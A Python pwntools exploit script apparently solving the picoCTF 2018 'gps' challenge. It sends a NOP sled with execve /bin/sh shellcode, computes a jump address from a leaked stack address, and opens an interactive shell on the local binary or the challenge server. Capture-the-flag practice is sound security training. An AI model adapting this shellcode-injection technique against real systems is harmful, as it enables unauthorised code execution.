from pwn import *
import json

LOCAL = True # If set to false then you will try to connect to the pico server

local_bin = './gps'
elf = ELF(local_bin)

'''
If you are running this on your local machine then all you need is to start
the process. However, if you are trying to solve on the server then you must
set up the ssh conection and begin the process by actually sending a line with
the execution statement in it
'''
if(LOCAL):
    p = process(local_bin)

else:
    p = remote('2018shell.picoctf.com',58896)

payload = "\x90"*100 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = "\x90"*(0x1000 - 5 - len(asm(shellcraft.amd64.linux.sh()))) + asm(shellcraft.amd64.linux.sh())
print p.recvline()
print p.recvline()
print p.recvline()
print p.recvline()
print p.recvline()
print p.recvline()
print p.recvline()
print p.recvline()
print p.recvline()
position = p.recvline().split()
print "original = " + position[2]
new =  int(position[2],16) + 1337

print p.recvline()
p.sendline(payload)
print p.recvline()
p.sendline(hex(new))
#print p.recvline()
p.interactive()
exit()
